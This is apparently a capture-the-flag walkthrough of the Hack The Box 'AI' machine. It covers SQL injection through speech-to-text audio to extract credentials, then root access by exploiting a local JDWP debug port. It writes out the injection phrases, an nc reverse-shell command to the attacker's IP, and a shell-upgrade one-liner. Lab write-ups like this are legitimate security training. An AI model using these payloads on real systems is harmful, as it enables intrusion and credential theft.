<h2>AI</h2>
<h3>The Basics</h3>
The first thing we should do is map the box IP address to the box name  .htb in the `/etc/hosts` file.
`10.10.10.163   ai.htb`

<h3>Initial Scan</h3>
Next up we will run a all port NMAP scan `nmap -sC -sV -p- 10.10.10.163`. We get results back for 2 ports: 22 SSH open and 80 HTTP open.

<h3>Web Enumeration</h3>
Let's take a look at port 80 and run a gobuster.

We quickly get some promising results. We'll take a look at **ai.php** and **intelligence.php**. It looks like we have some upload functionality for `.wav` files. The AI will process the `.wav` files into a search query. Looking at the intelligence page, we can get an overview of some commands and their results after processing by the AI. The page also hints to Microsoft and a **Male US** voice model. After some googling I found a free [Text-To-Speech service](https://www.text2speech.org/) with a Male US voice model and an extended [Speech-To-Text table](https://support.microsoft.com/en-us/help/12427/windows-speech-recognition-commands).

<h3>Generating wav files to dump credentials from the MySQL database</h3>
The speech-to-text table contains output that strongly hints to SQL injection, like `union, schema, comma, period, -- -`. So let's try to generate a `.wav` file and test this.

We generate [single-quote.wav](/assets/audio/single-quote.wav) which contains "open single quote", this should result in a single quote after processing by the AI.

Next up let's try dumping credentials. We generate [username.wav](/assets/audio/username.wav) and [password.wav](/assets/audio/password.wav) which contain:
~~~
open single quote union select         yusername from users comment database
open single quote union selectpassword from users comment database
~~~

To make sure the AI parses our commands correctly we have to play around with the speed, spacing and spelling.

We successfully extract a username and password.

<h3>User flag and enumeration</h3>
With our credentials, we can SSH into the user and grab the user flag.
`ssh al***@ai.htb`.

For the next part we will do some heavy enumeration. We run the following scripts and go through the output to look for anything of interest:

* [Jalesc](https://github.com/itsKindred/jalesc)
* [LinEnum](https://github.com/Cerbersec/scripts/blob/master/linux/LinEnum.sh)
* [Linpeas](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh)
* [PSPY](https://github.com/Cerbersec/scripts/blob/master/linux/pspy64)

Looking at the running processes output from **linpeas.sh** we can see `-agentlib:jdwp` is flagged with a **99% PE**.

Monitoring **pspy64** we see some interesting output regarding `/root/tomcat.sh` which seems to be killing and restarting a Tomcat instance which spawns the same process which was flagged by **linpeas**.

![pspy](/assets/images/ai-pspy.png)

If we take a look at the network connections and listeners with `netstat -auntp` we see **localhost** is listening on ports 8000, 8080, 8005 and 8009. From the previous output we know the Tomcat server is running on port 8000.

<h3>Exploiting JDWP to gain a root shell</h3>
The Java Debug Wire Protocol (JDWP) enables remote debugging of java applications with the Java Debugger (JDB). Googling for a [JDWP exploit](https://github.com/IOActive/jdwp-shellifier) will find us a Github Repository with a JDWP exploitation script called **jdwp-shellifier.py**.

Because the default netcat binary on the box doesn't support the `-e` flag, we will upload our own `/usr/bin/nc` to `/tmp`, we will also upload the **jdwp-shellifier.py** script.
Before we run the script we will set up a listener with `nc -lnvp 444`. Now we can run the exploit:

~~~
./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd '/tmp/nc  10.10.14.XXX 444 -e /bin/bash'
~~~

We successfully get a connection back and can upgrade our shell using python:

~~~python
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
~~~

Now we can grab the root flag.
